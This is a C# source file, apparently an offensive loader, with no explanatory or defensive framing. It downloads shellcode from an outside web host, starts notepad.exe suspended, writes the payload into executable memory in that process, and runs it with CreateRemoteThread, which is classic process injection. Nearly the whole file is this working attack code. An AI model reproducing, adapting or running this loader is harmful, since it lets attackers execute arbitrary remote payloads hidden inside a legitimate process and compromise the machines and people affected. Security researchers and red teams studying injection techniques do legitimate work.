using System.Runtime.InteropServices;
using CreteRemoteThread;

// download shellcode
byte[] shellcode;
using (var client = new HttpClient())
{
    client.BaseAddress = new Uri("https://www.infinity-bank.com");
    shellcode = await client.GetByteArrayAsync("/shellcode/p/bhttp");
}

// spawn notepad suspended
var startupInfo = new Win32.STARTUPINFO();
startupInfo.cb = Marshal.SizeOf(startupInfo);

var success = Win32.CreateProcessW(
    null,
    "notepad.exe",
    IntPtr.Zero,
    IntPtr.Zero,
    false,
    0x00000004,  // CREATE_SUSPENDED
    IntPtr.Zero,
    null,
    ref startupInfo,
    out var processInfo);

if (!success)
{
    Console.WriteLine($"[x] CreateProcessW failed: {Marshal.GetLastWin32Error()}");
    return;
}

Console.WriteLine($"[+] Spawned notepad PID: {processInfo.dwProcessId}");

// allocate RWX memory in remote process
var ptr = Win32.VirtualAllocEx(
    processInfo.hProcess,
    IntPtr.Zero,
    (uint)shellcode.Length,
    0x3000,  // MEM_COMMIT | MEM_RESERVE
    0x40);   // PAGE_EXECUTE_READWRITE

// write shellcode
Win32.WriteProcessMemory(
    processInfo.hProcess,
    ptr,
    shellcode,
    (uint)shellcode.Length,
    out _);

// inject and run
Win32.CreateRemoteThread(
    processInfo.hProcess,
    IntPtr.Zero,
    0,
    ptr,
    IntPtr.Zero,
    0,
    out _);

Console.WriteLine("dwProcessId : {0}", processInfo.dwProcessId);
Console.WriteLine("dwThreadId  : {0}", processInfo.dwThreadId);
Console.WriteLine("hProcess    : 0x{0:X}", processInfo.hProcess);
Console.WriteLine("hThread     : 0x{0:X}", processInfo.hThread);

Win32.CloseHandle(processInfo.hThread);
Win32.CloseHandle(processInfo.hProcess);

